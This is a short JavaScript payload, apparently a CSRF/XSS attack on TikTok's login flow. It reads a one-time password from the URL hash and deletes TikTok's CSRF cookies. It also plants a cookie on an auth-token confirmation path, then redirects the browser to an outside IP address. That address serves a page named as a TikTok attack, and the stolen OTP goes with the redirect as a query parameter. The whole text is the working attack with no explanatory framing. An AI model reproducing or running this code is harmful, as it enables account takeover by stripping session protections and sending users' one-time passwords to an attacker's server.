// Extract OTP from URL hash
const urlHash = window.location.hash;
const otpMatch = urlHash.match(/#otp=([^&]+)/);
const otp = otpMatch ? otpMatch[1] : '';
 
// Function to delete cookies by name
function deleteCookie(name) {
    document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.tiktok.com`;
}
 
deleteCookie('passport_csrf_token');
deleteCookie('passport_csrf_token_default');
document.cookie = "tt-target-idc=useast5; path=/passport/sotl/app2web/confirm_auth_token/; domain=.tiktok.com; SameSite=None; Secure";
 
// Redirect after 2 seconds with OTP as a query parameter
setTimeout(() => {
    window.location.href = `http://142.93.164.25/tiktok-csrf-xss-attack2.html?otp=${encodeURIComponent(otp)}`;
}, 2000);